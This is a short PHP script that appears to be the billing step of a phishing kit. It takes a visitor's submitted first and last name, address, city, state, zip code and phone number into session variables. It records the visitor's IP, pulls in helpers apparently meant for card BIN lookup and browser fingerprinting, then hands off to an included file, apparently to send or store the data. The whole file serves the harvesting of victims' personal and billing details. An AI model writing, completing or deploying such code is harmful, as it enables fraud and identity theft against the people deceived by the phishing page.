<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
$_SESSION['loged'] = "BILLINGs";

$_SESSION['TIME_DATE'] = $TIME_DATE;



include 'function.php';
include("system.php");

$_SESSION['First_Name']     = $_POST['Firstname'];
$_SESSION['Last_Name']      = $_POST['LastName'];
$_SESSION['Address']        = $_POST['addres'];
$_SESSION['City']          = $_POST['City'];
$_SESSION['State']         = $_POST['State'];
$_SESSION['Zip_code']        = $_POST['zipCod'];
$_SESSION['Phone_Number']   = $_POST['phoneNumber'];
$_SESSION['Phone_Number'] = preg_replace('/[ \(\)-]/', '', $_SESSION['Phone_Number']);



$ip=$_SESSION['ip']=getip();





include('../tnt/sv1.php');


?>